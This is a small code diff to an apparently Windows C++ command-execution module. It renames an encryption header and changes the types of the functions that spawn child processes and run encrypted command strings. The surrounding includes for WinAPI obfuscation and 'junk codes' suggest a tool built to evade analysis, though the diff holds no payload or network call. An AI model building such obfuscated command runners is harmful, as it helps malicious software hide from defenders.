@@ -4,7 +4,7 @@
 #include "winapi_function_signatures.h"
 #include "winapi_obfuscation.h"
 #include "junk_codes.h"
-#include "string_encryption.h"
+#include "byte_encryption.h"
 
 namespace {
 	std::string GetLastErrorAsString()
@@ -24,7 +24,7 @@ namespace {
 		return message;
 	}
 
-	void createChildProc(HANDLE stdOutRead, HANDLE stdOutWrite, EncryptedString& cmd_string, std::string command)
+	void createChildProc(HANDLE stdOutRead, HANDLE stdOutWrite, EncryptedBytes& cmd_string, std::string command)
 	{
 		PROCESS_INFORMATION procInfo;
 		STARTUPINFOA startInfo;
@@ -57,7 +57,7 @@ namespace {
 	}
 }
 
-std::string exec(EncryptedString &cmd_string, std::string command)
+std::string exec(EncryptedBytes &cmd_string, std::string command)
 {
 	SECURITY_ATTRIBUTES securityAttr;
 
